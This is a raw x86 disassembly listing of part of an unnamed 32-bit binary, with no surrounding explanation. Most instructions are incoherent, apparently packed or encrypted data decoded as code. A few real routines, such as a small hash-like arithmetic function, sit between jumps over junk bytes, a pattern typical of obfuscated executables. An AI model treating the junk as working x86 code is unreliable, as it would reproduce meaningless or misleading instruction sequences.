  405131:	mov    cl,0xec
  405133:	(bad)  
  405134:	out    0x1,eax
  405136:	test   BYTE PTR [ebx],bh
  405138:	inc    edx
  405139:	mov    ebp,0x6b3820f2
  40513e:	inc    edi
  40513f:	add    ebp,DWORD PTR [esi+0x2ad76a9a]
  405145:	std    
  405146:	call   0xe9b2719f
  40514b:	stos   DWORD PTR es:[edi],eax
  40514c:	popa   
  40514d:	aaa    
  40514e:	sar    BYTE PTR [ebx],0xa2
  405151:	ss jae 0x405153
  405154:	sub    bh,BYTE PTR [esi+eiz*4]
  405157:	or     al,0x13
  405159:	int3   
  40515a:	lea    eax,[edi-0x12]
  40515d:	cmp    esp,esi
  40515f:	in     eax,0x5f
  405161:	leave  
  405162:	sub    esi,edi
  405164:	fucom  st(7)
  405166:	sahf   
  405167:	das    
  405168:	sub    al,al
  40516a:	(bad)  
  40516b:	cmc    
  40516c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40516d:	test   BYTE PTR ds:0xc20558f1,0xfc
  405174:	iret   
  405175:	xor    DWORD PTR [edi-0x29],ebx
  405178:	aaa    
  405179:	(bad)  
  40517a:	jecxz  0x4051b8
  40517c:	inc    ecx
  40517d:	out    dx,al
  40517e:	dec    edi
  40517f:	or     esi,eax
  405181:	push   esp
  405182:	xchg   ebx,eax
  405183:	fsubr  st(5),st
  405185:	jg     0x4051d0
  405187:	fistp  DWORD PTR [ebx+ecx*8+0x7]
  40518b:	popf   
  40518c:	jecxz  0x4051af
  40518e:	xchg   ebx,eax
  40518f:	add    ecx,esp
  405191:	mov    ah,0x9b
  405193:	btc    DWORD PTR [edx+0x48f4451e],ebp
  40519a:	pop    esp
  40519b:	js     0x405160
  40519d:	or     ecx,0xfffffff2
  4051a0:	jnp    0x4051c2
  4051a2:	ins    BYTE PTR es:[edi],dx
  4051a3:	mov    WORD PTR [ecx],?
  4051a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051a6:	xchg   edx,eax
  4051a7:	sbb    ah,bh
  4051a9:	test   DWORD PTR [esi+edi*4+0x139b8f94],esi
  4051b0:	retf   
  4051b1:	neg    BYTE PTR [edi-0x6d]
  4051b4:	push   eax
  4051b5:	push   es
  4051b6:	in     eax,0xa0
  4051b8:	push   0xffffffce
  4051ba:	(bad)  
  4051bb:	repnz and bl,dl
  4051be:	lock les eax,FWORD PTR [ebx]
  4051c1:	fst    st(0)
  4051c3:	(bad)  
  4051c4:	ret    
  4051c5:	jl     0x405205
  4051c7:	jmp    0x66f391ac
  4051cc:	sub    cl,ch
  4051ce:	and    DWORD PTR [edx-0x40],esi
  4051d1:	dec    ebx
  4051d2:	std    
  4051d3:	inc    edi
  4051d4:	cmp    ebp,DWORD PTR [edi+0x4b]
  4051d7:	jne    0x405216
  4051d9:	pop    edi
  4051da:	out    dx,al
  4051db:	out    0x81,eax
  4051dd:	mov    es,WORD PTR [ebp+0x3a]
  4051e0:	or     BYTE PTR [edx-0x39594dca],bl
  4051e6:	das    
  4051e7:	cs push 0xfe5be944
  4051ed:	scas   eax,DWORD PTR es:[edi]
  4051ee:	mov    BYTE PTR [edx+0x1a319edc],ch
  4051f4:	sbb    al,0x3f
  4051f6:	jae    0x405268
  4051f8:	add    bl,dh
  4051fa:	fcom   DWORD PTR [ebx-0x1364854e]
  405200:	mov    edx,0xeb8e7d7f
  405205:	xchg   esp,eax
  405206:	cwde   
  405207:	pop    ebp
  405208:	enter  0x9745,0xb2
  40520c:	cdq    
  40520d:	push   0x1608e6b9
  405212:	pop    esp
  405213:	add    edi,esi
  405215:	inc    esi
  405216:	in     eax,0x4a
  405218:	(bad)
  40521d:	leave  
  40521e:	int    0x6
  405220:	inc    esp
  405221:	imul   esp,DWORD PTR ds:0x492cfc79,0x41d7db2c
  40522b:	sub    ch,BYTE PTR [ebx]
  40522d:	push   edx
  40522e:	outs   dx,BYTE PTR ds:[esi]
  40522f:	(bad)  
  405230:	mov    ah,0x32
  405232:	mov    ds:0xc4c8d61b,eax
  405237:	jae    0x4052a3
  405239:	inc    ebx
  40523a:	ror    DWORD PTR [ecx+0x458b0c45],1
  405240:	cld    
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0x15603839
  40528d:	cvtdq2ps xmm5,XMMWORD PTR [edx]
  405290:	jle    0x405310
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x405259
  405297:	adc    eax,0xa493c7c8
  40529c:	cli    
  40529d:	frstor [esi]
  40529f:	add    ebp,edx
  4052a1:	xor    BYTE PTR [edx+0x5c00aee5],cl
  4052a7:	jns    0x405239
  4052a9:	ins    DWORD PTR es:[edi],dx
  4052aa:	retf   
  4052ab:	mov    esi,0x2e85fbf5
  4052b0:	inc    edx
  4052b1:	test   eax,0x29e3455a
  4052b6:	sbb    DWORD PTR [esi-0x33],0xffffffc4
  4052ba:	sub    al,0xac
  4052bc:	fsubr  DWORD PTR [eax-0x30]
  4052bf:	stos   BYTE PTR es:[edi],al
  4052c0:	sbb    ecx,edx
  4052c2:	cmp    esp,DWORD PTR [ebx+0x22]
  4052c5:	xor    bh,BYTE PTR ds:0x903ccf27
  4052cb:	xor    al,0x2d
  4052cd:	cli    
  4052ce:	add    esp,ebx
  4052d0:	dec    ebx
  4052d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052d2:	pushf  
  4052d3:	mov    eax,ds:0xe6ffb862
  4052d8:	or     BYTE PTR ds:0x819b6e69,dl
  4052de:	xchg   ebx,eax
  4052df:	(bad)  
  4052e0:	fwait
  4052e1:	cmp    eax,0x3cc7f290
  4052e6:	xchg   esp,ebx
  4052e8:	add    eax,0x76394595
  4052ed:	mov    esp,0x1eb8f764
  4052f2:	sbb    al,0xec
  4052f4:	pop    ebx
  4052f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052f6:	jp     0x4052fd
  4052f8:	nop
  4052f9:	add    BYTE PTR [edi+0x4b],dh
  4052fc:	sub    al,0x59
  4052fe:	int3   
  4052ff:	push   ebp
  405300:	mov    ds:0x1d86ca6e,eax
  405305:	js     0x40533a
  405307:	xor    dl,0x90
  40530a:	inc    BYTE PTR [ebx+0x3a648cd3]
  405310:	push   esp
  405311:	xor    DWORD PTR [ebp+ecx*2-0x6d8df9c9],0x65
  405319:	shr    BYTE PTR ds:0x6bb9521f,0x46
  405320:	loopne 0x4052a9
  405322:	ins    BYTE PTR es:[edi],dx
  405323:	mov    edi,eax
  405325:	jl     0x4052b0
  405327:	cdq    
  405328:	(bad)  
  405329:	movzx  esi,BYTE PTR [ebp-0x1e]
  40532d:	in     al,0x95
  40532f:	pop    es
  405330:	jp     0x4052d8
  405332:	aad    0x6b
  405334:	test   eax,0x180ca6e9
  405339:	lahf   
  40533a:	cdq    
  40533b:	inc    esp
  40533c:	aam    0xf2
  40533e:	xchg   ebx,eax
  40533f:	jmp    DWORD PTR [edx-0x6b]
  405342:	rol    bh,cl
  405344:	jmp    0x93f1:0x1d2d3f1e
  40534b:	pop    edi
  40534c:	push   ds
  40534d:	(bad)  
  40534e:	aad    0x70
  405350:	cs jnp 0x40539b
  405353:	clc    
  405354:	add    BYTE PTR [eax-0x62],0x43
  405358:	push   0xffffffa0
  40535a:	out    0x46,al
  40535c:	xor    eax,0x83c10a05
  405361:	test   al,0x71
  405363:	and    ebp,DWORD PTR [eax]
  405365:	mov    bl,0xa7
  405367:	dec    edx
  405368:	adc    ecx,DWORD PTR [edi+edx*2-0x48]
  40536c:	pop    esp
  40536d:	scas   al,BYTE PTR es:[edi]
  40536e:	or     BYTE PTR [edi],cl
  405370:	xor    al,BYTE PTR [esi+esi*1-0x30]
  405374:	pop    ecx
  405375:	dec    ebp
  405376:	mov    bh,0x14
  405378:	shl    DWORD PTR [ecx],cl
  40537a:	add    DWORD PTR [ecx],ebx
  40537c:	imul   edx,DWORD PTR [edi-0x6c],0x3a
  405380:	ds shr eax,0xe9
  405384:	test   eax,0x1b552b70
  405389:	sti    
  40538a:	pop    eax
  40538b:	(bad)  
  40538c:	and    eax,0xcebb8e8c
  405391:	and    esi,DWORD PTR [edx-0xe]
  405394:	out    dx,eax
  405395:	push   eax
  405396:	pop    ax
  405398:	imul   ebp,esi,0x4e
  40539b:	out    0x8a,eax
  40539d:	or     ch,BYTE PTR [ebx]
  40539f:	out    dx,al
  4053a0:	xchg   esi,eax
  4053a1:	adc    al,0x44
  4053a3:	mov    esp,0xe89d9e49
  4053a8:	inc    esp
  4053a9:	enter  0x41e9,0xb0
  4053ad:	xchg   esi,eax
  4053ae:	xlat   BYTE PTR ds:[ebx]
  4053af:	in     al,dx
  4053b0:	daa    
  4053b1:	jge    0x405386
  4053b3:	cmp    bh,BYTE PTR [esi+0x77]
  4053b6:	pop    ss
  4053b7:	scas   al,BYTE PTR es:[edi]
  4053b8:	addr16 mov esi,0x137ed346
  4053be:	ja     0x4053ad
  4053c0:	not    dh
  4053c2:	push   ds
  4053c3:	sahf   
  4053c4:	iret   
  4053c5:	sbb    BYTE PTR ss:[edx-0x5a219979],ch
  4053cc:	or     DWORD PTR [ebx+0x7f],edi
  4053cf:	mov    BYTE PTR [esp+esi*2],cl
  4053d2:	fcom   QWORD PTR fs:[esi]
  4053d5:	call   0xe77e8d20
  4053da:	dec    edi
  4053db:	fld    DWORD PTR [ebx]
  4053dd:	cmp    eax,0xc518a123
  4053e2:	mov    ebx,0xbaed097
  4053e7:	jae    0x405408
  4053e9:	add    DWORD PTR [ebp-0x294dc493],ebx
  4053ef:	test   BYTE PTR [ecx],ch
  4053f1:	jo     0x405465
  4053f3:	dec    ecx
  4053f4:	jmp    0xd3f93661
  4053f9:	nop
  4053fa:	sub    esi,DWORD PTR [ecx-0x55b82d98]
  405400:	popa   
  405401:	in     al,0xb4
  405403:	stc    
  405404:	in     eax,dx
  405405:	clc    
  405406:	sbb    dh,BYTE PTR [ebp-0x79f9e207]
  40540c:	adc    DWORD PTR ds:0xb288921f,ecx
  405412:	dec    edx
  405413:	push   0x66115d53
  405418:	pop    edx
  405419:	pop    edx
  40541a:	popa   
  40541b:	(bad)  [esi]
  40541d:	int3   
  40541e:	mov    al,ds:0x92675452
  405423:	xor    al,BYTE PTR [esi]
  405425:	rcl    BYTE PTR [edx+0x52],1
  405428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405429:	rol    BYTE PTR [esi+0x4b4d7cef],cl
  40542f:	jg     0x405447
  405431:	inc    ecx
  405432:	out    0x15,eax
  405434:	mov    bh,0xfc
  405436:	call   FWORD PTR [edx+0xc]
  405439:	mov    esi,0x6988b660
  40543e:	mov    al,0x8e
  405440:	mov    eax,ds:0x5f88ce3b
  405445:	jb     0x40547a
  405447:	xor    al,0xc2
  405449:	jnp    0x40540e
  40544b:	adc    edx,ebx
  40544d:	rcr    DWORD PTR [edx+0x209528b4],1
  405453:	dec    ebp
  405454:	sub    al,0x67
  405456:	push   edx
  405457:	in     eax,0x7e
  405459:	add    edx,edi
  40545b:	aam    0xdf
  40545d:	inc    esi
  40545e:	loope  0x405460
  405460:	xor    BYTE PTR [eax],al
  405462:	mov    BYTE PTR [ecx-0x325a1c82],dh
  405468:	xchg   esi,eax
  405469:	xchg   BYTE PTR [eax],dh
  40546b:	std    
  40546c:	xchg   BYTE PTR [ebp-0x4f],bh
  40546f:	test   DWORD PTR [ebp-0x3cbb2d01],esi
  405475:	repz (bad) 
  405477:	dec    ebx
  405478:	imul   edx,DWORD PTR [eax+ebp*1],0x64
  40547c:	(bad)  
  40547d:	out    0x80,eax
  40547f:	ins    DWORD PTR es:[edi],dx
  405480:	clc    
  405481:	dec    edi
  405482:	cld    
  405483:	ds dec ecx
  405485:	fwait
  405486:	scas   al,BYTE PTR es:[edi]
  405487:	fbld   TBYTE PTR [eax+0x20]
  40548a:	es pop eax
  40548c:	adc    al,0x9
  40548e:	jae    0x4054ab
  405490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405491:	retf   
  405492:	add    al,0xcd
  405494:	cmove  esp,DWORD PTR [edx+edi*1-0x56]
  405499:	pop    ecx
  40549a:	retf   
  40549b:	add    DWORD PTR [edi+0x6f659c64],edi
  4054a1:	sahf   
  4054a2:	cmc    
  4054a3:	push   edi
  4054a4:	push   ebp
  4054a5:	(bad)  
  4054a6:	sbb    esp,DWORD PTR [edi-0x32]
  4054a9:	mov    BYTE PTR [edi-0x2ef3acd],0x36
  4054b0:	or     BYTE PTR [esi],ah
  4054b2:	sbb    DWORD PTR [edx-0x15],esp
  4054b5:	aad    0x9b
  4054b7:	pop    esi
  4054b8:	std    
  4054b9:	fmul   QWORD PTR [ebp+ebx*8+0x76]
  4054bd:	int    0xc9
  4054bf:	setb   BYTE PTR [ebx+0x27]
  4054c3:	pop    ebp
  4054c4:	lods   al,BYTE PTR es:[esi]
  4054c6:	or     al,0x9d
  4054c8:	xor    BYTE PTR [esi+0x1b],0xef
  4054cc:	scas   al,BYTE PTR es:[edi]
  4054cd:	or     bl,BYTE PTR [eax+0x44]
  4054d0:	adc    esi,DWORD PTR [esi-0x72]
  4054d3:	mov    esi,0x27ffa776
  4054d8:	inc    eax
  4054d9:	in     eax,dx
  4054da:	add    eax,0xc311863
  4054df:	shr    ebx,1
  4054e1:	jp     0x405505
  4054e3:	(bad)  
  4054e4:	sub    al,BYTE PTR [edx+0x1ec62603]
  4054ea:	ins    BYTE PTR es:[edi],dx
  4054eb:	rol    DWORD PTR [edi],cl
  4054ed:	push   edi
  4054ee:	das    
  4054ef:	fisubr DWORD PTR [ecx-0x5a]
  4054f2:	mov    ch,0xbd
  4054f4:	pop    edi
  4054f5:	or     BYTE PTR [eax-0x340fe01b],0x7e
  4054fc:	push   ds
  4054fd:	ds stc 
  4054ff:	lock in al,0x3d
  405502:	jnp    0x40553e
  405504:	xchg   ebp,eax
  405505:	push   es
  405506:	and    eax,0xa669b343
  40550b:	jp     0x4054df
  40550d:	dec    edi
  40550e:	stc    
  40550f:	adc    al,0xdc
  405511:	outs   dx,BYTE PTR ds:[esi]
  405512:	lahf   
  405513:	ret    0x2412
  405516:	scas   al,BYTE PTR es:[edi]
  405517:	mov    esi,0x31944376
  40551c:	fsubr  QWORD PTR [ebp+0x1794942f]
  405522:	shl    BYTE PTR [ebp+0x10],1
  405525:	mov    esp,0xe38c981d
  40552a:	ins    BYTE PTR es:[edi],dx
  40552b:	mov    ah,0xcb
  40552d:	mov    ?,edx
  40552f:	pop    ss
  405530:	push   esp
  405531:	cdq    
  405532:	in     eax,dx
  405533:	and    eax,0xaedb8ad0
  405538:	mov    bh,0xa
  40553a:	mov    dl,BYTE PTR [edi]
  40553c:	push   ebp
  40553d:	pop    ebx
  40553e:	mov    ah,0xc8
  405540:	retf   
  405541:	xchg   BYTE PTR [edi],cl
  405543:	pop    ebp
  405544:	inc    eax
  405545:	jmp    0x69d9:0xdd2166d1
  40554c:	pop    ss
  40554d:	(bad)  
  40554e:	into   
  40554f:	ins    DWORD PTR es:[edi],dx
  405550:	xchg   ecx,eax
  405551:	stos   BYTE PTR es:[edi],al
  405552:	data16 (bad) 
  405554:	jecxz  0x40551b
  405556:	dec    ecx
  405557:	or     al,0x53
  405559:	in     eax,0x92
  40555b:	mov    esi,DWORD PTR [ecx+0x4d]
  40555e:	push   ss
  40555f:	push   0x4e
  405561:	inc    ebx
  405562:	(bad)  
  405563:	jbe    0x40553b
  405565:	test   eax,0x30c4c94b
  40556a:	aaa    
  40556b:	dec    ecx
  40556c:	add    ah,BYTE PTR [esi+0x2574e634]
  405572:	lds    edi,FWORD PTR [ecx]
  405574:	cmp    DWORD PTR [ebp+0x58],edi
  405577:	iret   
  405578:	sbb    ecx,DWORD PTR [esi-0x40b84e92]
  40557e:	xchg   ebp,eax
  40557f:	test   ecx,0x88431ffb
  405585:	jo     0x40557f
  405587:	mov    ebp,0xac7d7427
  40558c:	mov    esi,es
  40558e:	sub    DWORD PTR [eax],ebx
  405590:	call   0x82c86b2d
  405595:	mov    al,0xd4
  405597:	cdq    
  405598:	pop    ds
  405599:	xor    bl,BYTE PTR [ebp+0x36]
  40559c:	cmc    
  40559d:	inc    ebp
  40559e:	arpl   WORD PTR [edx],di
  4055a0:	pop    eax
  4055a1:	cwde   
  4055a2:	mov    ch,0x63
  4055a4:	jmp    0xa40f1dc2
  4055a9:	aam    0x74
  4055ab:	fmul   QWORD PTR [esi+0x69]
  4055ae:	daa    
  4055af:	mov    bh,0xb3
  4055b1:	call   0xef60:0x3b363269
  4055b8:	and    DWORD PTR [ebx+0x1],ebp
  4055bb:	rol    dh,cl
  4055bd:	stos   BYTE PTR es:[edi],al
  4055be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055bf:	mov    al,0x73
  4055c1:	mov    ebp,0x76de2ae6
  4055c6:	shl    DWORD PTR [esi-0x47],0xa2
  4055ca:	mov    WORD PTR cs:[esp+eiz*4+0x51],fs
  4055cf:	push   cs
  4055d0:	or     bl,al
  4055d2:	push   ss
  4055d3:	xchg   edi,eax
  4055d4:	jbe    0x405628
  4055d6:	or     eax,0xa5b7134f
  4055db:	pop    esi
  4055dc:	push   ecx
  4055dd:	mov    eax,0x5a3fc9f
  4055e2:	mov    DWORD PTR [ebp-0x4],eax
  4055e5:	mov    DWORD PTR ds:0x434673,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	cs mov cl,0x46
  405605:	jmp    0x7e7677f9
  40560a:	jle    0x4055d0
  40560c:	jns    0x40568c
  40560e:	jle    0x405617
  405610:	sar    DWORD PTR [edi+0x5a686e26],0x7f
  405617:	inc    edx
  405618:	jae    0x4055d1
  40561a:	mov    dl,0xd7
  40561c:	repnz mov eax,0xef2b6de9
  405622:	push   0x36
  405624:	imul   edi,DWORD PTR [edx],0x42
  405627:	cwde   
  405628:	ds ins BYTE PTR es:[edi],dx
  40562a:	jl     0x40560f
  40562c:	sub    al,0x15
  40562e:	ss jne 0x4055e0
  405631:	adc    ebx,edi
  405633:	js     0x6c501b02
  405639:	int    0x4f
  40563b:	int    0x79
  40563d:	cmc    
  40563e:	cmp    eax,0x6282b7e7
  405643:	cld    
  405644:	mov    bh,0xf8
  405646:	pop    edx
  405647:	jge    0x4056a7
  405649:	sub    dh,bh
  40564b:	loope  0x4055fb
  40564d:	ins    DWORD PTR es:[edi],dx
  40564e:	ficomp DWORD PTR [esi-0x4f]
  405651:	jne    0x405619
  405653:	jo     0x40564e
  405655:	loop   0x405609
  405657:	mov    ecx,0x1ffe34dd
  40565c:	pusha  
  40565d:	in     al,0x46
  40565f:	sti    
  405660:	mov    edx,0x606e7c54
  405665:	mov    bh,0xe6
  405667:	imul   edx,DWORD PTR [eax],0xe
  40566a:	test   eax,0x2105ea8e
  40566f:	paddq  mm3,mm2
  405672:	test   eax,0xa4bd874f
  405677:	push   ebx
  405678:	fld    st(7)
  40567a:	std    
  40567b:	ds mov bl,0xe2
  40567e:	loop   0x40566c
  405680:	mov    esp,?
  405682:	jae    0x40569b
  405684:	xchg   edi,eax
  405685:	sub    eax,0x3209cb31
  40568a:	mov    ebx,0x8787a1c3
  40568f:	test   BYTE PTR [esi+0x515ebad6],0xe2
  405696:	or     al,cl
  405698:	pop    ds
  405699:	lods   al,BYTE PTR ds:[esi]
  40569a:	cmp    al,0x7
  40569c:	loopne 0x4056b3
  40569e:	and    eax,DWORD PTR [edx]
  4056a0:	in     al,0xe2
  4056a2:	enter  0x2ac3,0x76
  4056a6:	xchg   edx,eax
  4056a7:	mov    BYTE PTR [ebx-0x19],dl
  4056aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056ab:	gs pop esi
  4056ad:	xchg   ecx,eax
  4056ae:	data16 fucomip st,st(4)
  4056b1:	cli    
  4056b2:	repnz ds imul sp,sp,0x76
  4056b8:	pushf  
  4056b9:	dec    edx
  4056ba:	stos   DWORD PTR es:[edi],eax
  4056bb:	les    eax,FWORD PTR ds:0xbec27795
  4056c1:	jmp    DWORD PTR [edi+0x403fc7e8]
  4056c7:	aam    0xb2
  4056c9:	inc    BYTE PTR [ecx+0x69065bc2]
  4056cf:	add    ebp,DWORD PTR [edi-0x37]
  4056d2:	pushw  es
  4056d4:	sub    ecx,ecx
  4056d6:	imul   DWORD PTR [esi+0x5e173f47]
  4056dc:	add    esi,0x29
  4056df:	in     al,dx
  4056e0:	ins    BYTE PTR es:[edi],dx
  4056e1:	adc    DWORD PTR [esi+0x75],esi
  4056e4:	jb     0x4056e3
  4056e6:	pop    edi
  4056e7:	jmp    esi
  4056e9:	or     eax,0xaa977424
  4056ee:	sahf   
  4056ef:	jmp    0x7579:0xa37e9c40
  4056f6:	sbb    edi,eax
  4056f8:	push   esp
  4056f9:	das    
  4056fa:	jns    0x4056bb
  4056fc:	arpl   WORD PTR [edx],di
  4056fe:	int3   
  4056ff:	int3   
  405700:	ret    0xb86d
  405703:	sbb    DWORD PTR [esi-0x1787a61c],ebp
  405709:	push   ss
  40570a:	fbstp  TBYTE PTR [esi-0x1ac13413]
  405710:	adc    eax,0x74122dfb
  405715:	or     al,0x77
  405717:	fisttp DWORD PTR [ebp-0x74]
  40571a:	sub    al,0x78
  40571c:	push   esp
  40571d:	outs   dx,DWORD PTR ds:[esi]
  40571e:	aad    0xb8
  405720:	stc    
  405721:	sub    DWORD PTR [ebx],edx
  405723:	cwde   
  405724:	and    DWORD PTR [ebx+0x7c2053ab],esp
  40572a:	test   DWORD PTR [esi+0x41fd64ca],edi
  405730:	lahf   
  405731:	jge    0x4056b9
  405733:	mov    DWORD PTR ds:0x93edc01c,edx
  405739:	stc    
  40573a:	and    al,BYTE PTR [edx-0x7e]
  40573d:	and    esi,eax
  40573f:	mov    edi,0x3a0bb530
  405744:	les    edi,FWORD PTR [ebp-0x4c]
  405747:	pushf  
  405748:	inc    edx
  405749:	pop    edx
  40574a:	adc    BYTE PTR [ebp+0x4a4813a5],al
  405750:	fsubr  DWORD PTR [ebx+0x3d2742bc]
  405756:	push   ebx
  405757:	sbb    al,0xda
  405759:	aad    0x1c
  40575b:	inc    ecx
  40575c:	or     eax,esp
  40575e:	push   edx
  40575f:	push   esi
  405760:	push   edi
  405761:	adc    ebp,DWORD PTR [edi]
  405763:	ins    DWORD PTR es:[edi],dx
  405764:	cwde   
  405765:	jle    0x40575a
  405767:	outs   dx,DWORD PTR gs:[esi]
  405769:	jnp    0x40571c
  40576b:	je     0x405717
  40576d:	mov    cl,0x4c
  40576f:	add    DWORD PTR [ebp-0x7c1d348a],0xffffff84
  405776:	sub    BYTE PTR [edx-0x10],ah
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	icebp  
  40577b:	repnz fwait
  40577d:	jb     0x4057a3
  40577f:	jl     0x40572a
  405781:	in     al,0x4f
  405783:	mov    dl,0x5c
  405785:	xor    eax,0x8def5377
  40578a:	in     al,0x11
  40578c:	fst    DWORD PTR [ecx]
  40578e:	(bad)  
  40578f:	int3   
  405790:	mov    ebp,0x3ad6237e
  405795:	cmp    DWORD PTR [eax+0x0],esi
  405798:	test   DWORD PTR es:[edx+edx*4-0x3c],edi
  40579d:	outs   dx,DWORD PTR ds:[esi]
  40579e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40579f:	sub    eax,0x4ae294ba
  4057a4:	sbb    ebx,DWORD PTR [ebx-0x60]
  4057a7:	test   DWORD PTR [edx],eax
  4057a9:	mov    ecx,0xe8d6a62c
  4057ae:	in     al,0xe8
  4057b0:	jnp    0x40581c
  4057b2:	cli    
  4057b3:	setno  bh
  4057b6:	data16 jno 0x4057c6
  4057b9:	sbb    al,0xa
  4057bb:	sbb    eax,0x918e4564
  4057c0:	jae    0x4057ea
  4057c2:	xor    eax,0xf3048977
  4057c7:	pop    edx
  4057c8:	aas    
  4057c9:	jge    0x405809
  4057cb:	aas    
  4057cc:	jns    0x40578c
  4057ce:	or     al,0x6d
  4057d0:	adc    eax,0x8b11d3b
  4057d5:	push   0xffffffd2
  4057d7:	cmp    ebp,DWORD PTR [edx]
  4057d9:	in     eax,dx
  4057da:	jle    0x4057e6
  4057dc:	mov    bh,0x6
  4057de:	push   0x1a0e7b91
  4057e3:	mov    bh,0x55
  4057e5:	xchg   ebx,eax
  4057e6:	shl    bl,1
  4057e8:	fst    QWORD PTR [eax-0x9]
  4057eb:	sbb    al,0x43
  4057ed:	xor    al,0x92
  4057ef:	test   DWORD PTR [eax],esp
  4057f1:	dec    esi
  4057f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057f3:	add    DWORD PTR [edx-0x66cb1b5e],0xe42b3620
  4057fd:	pop    es
  4057fe:	js     0x405792
  405800:	push   ds
  405801:	xchg   esp,eax
  405802:	outs   dx,DWORD PTR ds:[esi]
  405803:	push   ebx
  405804:	inc    ecx
  405805:	push   ss
  405806:	es sub ebx,edx
  405809:	xchg   BYTE PTR [ebx+ebp*4-0x12],bh
  40580d:	ror    BYTE PTR [edi],1
  40580f:	lahf   
  405810:	sar    DWORD PTR [ebx+ebx*1],cl
  405813:	call   0x5091fc65
  405818:	(bad)  
  405819:	das    
  40581a:	popa   
  40581b:	fistp  QWORD PTR [edx+eiz*2+0x6021b5e2]
  405822:	sbb    ah,BYTE PTR [eax+ebx*4+0x20d046b0]
  405829:	bnd jbe 0x4057b9
  40582c:	or     al,0x83
  40582e:	sub    BYTE PTR [ebp+0x3d88ac3e],cl
  405834:	cld    
  405835:	inc    ecx
  405836:	pop    edx
  405837:	in     al,0xc5
  405839:	popf   
  40583a:	mov    ecx,0xbc8a2ba1
  40583f:	push   ebp
  405840:	pop    ecx
  405841:	adc    al,0xa7
  405843:	cli    
  405844:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  405846:	add    cl,BYTE PTR [ebp-0x40]
  405849:	ja     0x40580b
  40584b:	cmp    BYTE PTR [edx],0xa8
  40584e:	mov    bh,ch
  405850:	shr    BYTE PTR [ebp-0x8],cl
  405853:	pop    ds
  405854:	out    dx,al
  405855:	dec    ebx
  405856:	bnd jge 0x4057f7
  405859:	arpl   dx,dx
  40585b:	or     DWORD PTR [ebx-0x37],0xe69b850f
  405862:	out    dx,al
  405863:	(bad)  
  405864:	adc    eax,0xe605c9cb
  405869:	stos   DWORD PTR es:[edi],eax
  40586a:	jae    0x40582d
  40586c:	lods   al,BYTE PTR ds:[esi]
  40586d:	lods   al,BYTE PTR ds:[esi]
  40586e:	add    al,BYTE PTR [esi-0x21]
  405871:	ror    ebp,1
  405873:	push   es
  405874:	(bad)  
  405875:	ror    DWORD PTR ds:0x27812f56,cl
  40587b:	jo     0x4058f8
  40587d:	daa    
  40587e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40587f:	adc    DWORD PTR [esi-0x5],esp
  405882:	or     cl,BYTE PTR [eax]
  405884:	jno    0x4058fb
  405886:	mov    ebx,0xfade99d6
  40588b:	cmp    al,0x8b
  40588d:	or     bh,ch
  40588f:	push   es
  405890:	das    
  405891:	sub    BYTE PTR [ecx+0x8250b66],cl
  405897:	clc    
  405898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405899:	jle    0x4058bf
  40589b:	jmp    0x405853
  40589d:	xor    ecx,DWORD PTR [eax+0x1e7e0803]
  4058a3:	loope  0x40586a
  4058a5:	(bad)  
  4058a6:	std    
  4058a7:	push   esp
  4058a8:	ins    DWORD PTR es:[edi],dx
  4058a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058aa:	imul   esp,esp,0xffffffc2
  4058ad:	mov    ch,0xc9
  4058af:	sub    BYTE PTR [edi],al
  4058b1:	mov    DWORD PTR gs:[edx],esp
  4058b4:	fldenv [ebp+eiz*1-0x59]
  4058b8:	cmp    DWORD PTR [ebx],ebp
  4058ba:	jo     0x405905
  4058bc:	stos   DWORD PTR es:[edi],eax
  4058bd:	das    
  4058be:	fwait
  4058bf:	in     al,dx
  4058c0:	add    eax,0xbaeac642
  4058c5:	jle    0x4058c9
  4058c7:	mov    dh,0x12
  4058c9:	and    bh,dh
  4058cb:	in     eax,0xdd
  4058cd:	imul   esp,DWORD PTR [ebx-0x6d],0x5b
  4058d1:	ror    DWORD PTR [ecx+0x51946bbb],0x23
  4058d8:	pop    edx
  4058d9:	addr16 (bad) 
  4058dc:	gs out dx,al
  4058de:	lods   al,BYTE PTR ds:[si]
  4058e0:	ror    DWORD PTR [eax],0x23
  4058e3:	scas   eax,DWORD PTR es:[edi]
  4058e4:	jmp    0x405947
  4058e6:	cli    
